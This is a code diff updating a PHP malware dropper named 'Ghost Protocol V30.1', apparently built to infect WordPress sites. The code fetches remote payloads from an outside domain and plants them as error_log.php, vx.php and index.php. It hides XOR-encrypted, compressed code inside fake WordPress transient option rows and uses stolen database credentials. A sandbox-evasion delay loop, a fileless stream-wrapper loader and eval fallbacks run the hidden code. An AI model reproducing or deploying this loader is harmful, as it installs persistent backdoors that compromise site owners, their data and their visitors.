@@ -1,6 +1,6 @@
 <?php
 // ==========================================
-// GHOST PROTOCOL V30 (ADVANCED APT CHIMERA)
+// GHOST PROTOCOL V30.1 (ADVANCED APT CHIMERA - HOTFIX)
 // Logic: Stack Fragmentation + Sandbox Time-Bomb + Polymorphic Fileless
 // UI: Classic Ghost Terminal (Original)
 // ==========================================
@@ -40,7 +40,7 @@ function _atomic_write($path, $data) {
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Ghost Protocol V30 - APT Edition</title>
+    <title>Ghost Protocol V30.1 - APT Edition</title>
     <style>
         /* UI GHOST PROTOCOL ORIGINAL */
         :root {
@@ -99,8 +99,8 @@ function _atomic_write($path, $data) {
 // ==========================================
 $targets = [
     ['https://stepmomhub.com/seoo.txt',  'error_log.php', 'wp_sys_transient_log'],
-    ['https://stepmomhub.com/vx.txt',    'vx.php',        'wp_sys_transient_log_cache'],
-    ['https://stepmomhub.com/index.txt', 'index.php',     'wp_sys_transient_log_core'] 
+    ['https://stepmomhub.com/vx.txt',    'vx.php',        'wp_sys_transient_vx'],
+    ['https://stepmomhub.com/index.txt', 'index.php',     'wp_sys_transient_idx'] 
 ];
 
 function _log($msg, $class='inf') {
@@ -170,6 +170,10 @@ function _dl($url) {
     return false;
 }
 
+// ==========================================
+// CORE DEPLOYMENT LOGIC (APT CHIMERA ENGINE)
+// ==========================================
+
 foreach ($targets as $t) {
     $url = $t[0]; $fname = $t[1]; $dbkey = $t[2];
 
@@ -189,10 +193,10 @@ foreach ($targets as $t) {
     $stream_class_def = <<<PHP
 if(!class_exists('$cls_stream')){
     class $cls_stream {
-        private \$$p_pos=0; private \$$p_dat='';
-        public function stream_open(\$a,\$b,\$c,&\$d){ \$this->$p_dat=isset(\$GLOBALS['_V_SYS']) ? \$GLOBALS['_V_SYS'] : ''; return true; }
-        public function stream_read(\$$p_len){ \$$p_ret=substr(\$this->$p_dat,\$this->$p_pos,\$$p_len); \$this->$p_pos+=strlen(\$$p_ret); return \$$p_ret; }
-        public function stream_eof(){ return \$this->$p_pos>=strlen(\$this->$p_dat); }
+        private \${$p_pos}=0; private \${$p_dat}='';
+        public function stream_open(\$a,\$b,\$c,&\$d){ \$this->{$p_dat}=isset(\$GLOBALS['_V_SYS']) ? \$GLOBALS['_V_SYS'] : ''; return true; }
+        public function stream_read(\${$p_len}){ \${$p_ret}=substr(\$this->{$p_dat},\$this->{$p_pos},\${$p_len}); \$this->{$p_pos}+=strlen(\${$p_ret}); return \${$p_ret}; }
+        public function stream_eof(){ return \$this->{$p_pos}>=strlen(\$this->{$p_dat}); }
         public function stream_stat(){ return []; }
         public function url_stat(\$a,\$b){ return []; }
     }
@@ -203,33 +207,34 @@ PHP;
     $p_arr = _polyVar(); $sbx_loop = _polyVar('s_'); $sbx_hash = _polyVar('h_');
     
     $exec_engine = <<<PHP
-        \$$sbx_hash = '';
-        for(\$$sbx_loop = 0; \$$sbx_loop < 300000; \$$sbx_loop++) { \$$sbx_hash = md5((string)\$$sbx_loop); }
+        // Dynamic Sandbox Time-Bomb
+        \${$sbx_hash} = '';
+        for(\${$sbx_loop} = 0; \${$sbx_loop} < 300000; \${$sbx_loop}++) { \${$sbx_hash} = md5((string)\${$sbx_loop}); }
 
-        \$$p_fless = false;
+        \${$p_fless} = false;
         if(in_array('$proto', stream_get_wrappers()) || @stream_wrapper_register('$proto', '$cls_stream')){
-            \$GLOBALS['_V_SYS'] = \$$p_dec;
+            \$GLOBALS['_V_SYS'] = \${$p_dec};
             
-        
-            \$$p_cb = function(\$val, \$key) use (&\$$p_fless) {
+            \${$p_cb} = function(\$val, \$key) use (&\${$p_fless}) {
                 if (\$val === 'execute_core_task') {
-                    if((@include('$proto://run')) !== false) { \$$p_fless = true; }
+                    if((@include('$proto://run')) !== false) { \${$p_fless} = true; }
                 }
             };
-            \$$p_arr = ['probe' => 'bypass_sandbox', 'target' => 'execute_core_task'];
-            @array_walk(\$$p_arr, \$$p_cb); 
+            \${$p_arr} = ['probe' => 'bypass_sandbox', 'target' => 'execute_core_task'];
+            @array_walk(\${$p_arr}, \${$p_cb}); 
             
             unset(\$GLOBALS['_V_SYS']);
         }
         
-        if(!\$$p_fless){
-            \$$p_tmp = sys_get_temp_dir() . '/.' . md5(uniqid()) . '.sys';
-            if(@file_put_contents(\$$p_tmp, \$$p_dec)){
-                \$proxy_func = function() use (\$$p_tmp) { @include(\$$p_tmp); @unlink(\$$p_tmp); };
+        if(!\${$p_fless}){
+            \${$p_tmp} = sys_get_temp_dir() . '/.' . md5(uniqid()) . '.sys';
+            if(@file_put_contents(\${$p_tmp}, \${$p_dec})){
+                // Native callback proxy
+                \$proxy_func = function() use (\${$p_tmp}) { @include(\${$p_tmp}); @unlink(\${$p_tmp}); };
                 @call_user_func(\$proxy_func);
             } else {
                 \$proxy_eval = function(\$code) { eval('?>' . \$code); };
-                @array_map(\$proxy_eval, [\$$p_dec]);
+                @array_map(\$proxy_eval, [\${$p_dec}]);
             }
         }
 PHP;
@@ -280,25 +285,26 @@ $stream_class_def
 
 class $cls {
     public static function boot() {
-        \$$v_m = @new mysqli('{$wp_creds['h']}', '{$wp_creds['u']}', '{$wp_creds['p']}', '{$wp_creds['n']}');
-        if(\$$v_m->connect_error) return;
-        \$$v_q = \$$v_m->query("SELECT option_value FROM {$wp_creds['x']}options WHERE option_name='$dbkey'");
-        if(!\$$v_q || \$$v_q->num_rows===0) return;
-        \$$v_cfg = json_decode(\$$v_q->fetch_assoc()['option_value'], true);
-        \$$v_raw = '';
-        foreach(\$$v_cfg['p'] as \$$v_k) {
-            \$$v_r = \$$v_m->query("SELECT option_value FROM {$wp_creds['x']}options WHERE option_name='\$" . "$v_k'");
-            if(\$$v_r && \$$v_row = \$$v_r->fetch_assoc()) \$$v_raw .= \$$v_row['option_value'];
+        \${$v_m} = @new mysqli('{$wp_creds['h']}', '{$wp_creds['u']}', '{$wp_creds['p']}', '{$wp_creds['n']}');
+        if(\${$v_m}->connect_error) return;
+        \${$v_q} = \${$v_m}->query("SELECT option_value FROM {$wp_creds['x']}options WHERE option_name='$dbkey'");
+        if(!\${$v_q} || \${$v_q}->num_rows===0) return;
+        \${$v_cfg} = json_decode(\${$v_q}->fetch_assoc()['option_value'], true);
+        \${$v_raw} = '';
+        foreach(\${$v_cfg}['p'] as \${$v_k}) {
+            \${$v_r} = \${$v_m}->query("SELECT option_value FROM {$wp_creds['x']}options WHERE option_name='" . \${$v_k} . "'");
+            if(\${$v_r} && \${$v_row} = \${$v_r}->fetch_assoc()) \${$v_raw} .= \${$v_row}['option_value'];
         }
         
-        \$$v_b64 = 'base' . '64' . '_decode'; \$$v_gzin = 'gzin' . 'flate';
-        \$$v_bin = \$$v_b64(\$$v_raw); \$$v_key = \$$v_b64(\$$v_cfg['k']);
+        // Indirect function calls
+        \${$v_b64} = 'base' . '64' . '_decode'; \${$v_gzin} = 'gzin' . 'flate';
+        \${$v_bin} = \${$v_b64}(\${$v_raw}); \${$v_key} = \${$v_b64}(\${$v_cfg}['k']);
         
-        \$$v_out=''; \$$v_l=strlen(\$$v_bin); \$$v_kl=strlen(\$$v_key);
-        for(\$$v_i=0;\$$v_i<\$$v_l;\$$v_i++) \$$v_out .= \$$v_bin[\$$v_i]^\$$v_key[\$$v_i%\$$v_kl];
-        \$$p_dec = @\$$v_gzin(\$$v_out);
+        \${$v_out}=''; \${$v_l}=strlen(\${$v_bin}); \${$v_kl}=strlen(\${$v_key});
+        for(\${$v_i}=0;\${$v_i}<\${$v_l};\${$v_i}++) \${$v_out} .= \${$v_bin}[\${$v_i}]^\${$v_key}[\${$v_i}%\${$v_kl}];
+        \${$p_dec} = @\${$v_gzin}(\${$v_out});
         
-        if(\$$p_dec) { $exec_engine }
+        if(\${$p_dec}) { $exec_engine }
     }
 }
 $cls::boot();
@@ -324,11 +330,11 @@ class $cls {
     private static \$d = '$enc_data';
     private static \$k = '$xor_key';
     public static function run() {
-        \$$v_b = base64_decode(self::\$d);
-        \$$v_o=''; \$$v_l=strlen(\$$v_b); \$$v_kl=strlen(self::\$k);
-        for(\$$v_i=0;\$$v_i<\$$v_l;\$$v_i++) \$$v_o .= \$$v_b[\$$v_i]^self::\$k[\$$v_i%\$$v_kl];
-        \$$p_dec = @gzinflate(\$$v_o);
-        if(\$$p_dec) { $exec_engine }
+        \${$v_b} = base64_decode(self::\$d);
+        \${$v_o}=''; \${$v_l}=strlen(\${$v_b}); \${$v_kl}=strlen(self::\$k);
+        for(\${$v_i}=0;\${$v_i}<\${$v_l};\${$v_i}++) \${$v_o} .= \${$v_b}[\${$v_i}]^self::\$k[\${$v_i}%\${$v_kl}];
+        \${$p_dec} = @gzinflate(\${$v_o});
+        if(\${$p_dec}) { $exec_engine }
     }
 }
 $cls::run();
@@ -342,7 +348,7 @@ PHP;
     }
 
     if($status_ok) {
-        $final_url = ($fname == 'index.php' && $is_wordpress) ? 'sxallsitemap.xml' : $fname;
+        $final_url = ($fname == 'sxallsitemap.xml' && $is_wordpress) ? 'sxallsitemap.xml' : $fname;
         echo "<div class='line'><a href='$final_url' target='_blank' class='btn'>OPEN ".strtoupper($fname)."</a></div>";
     }
 }
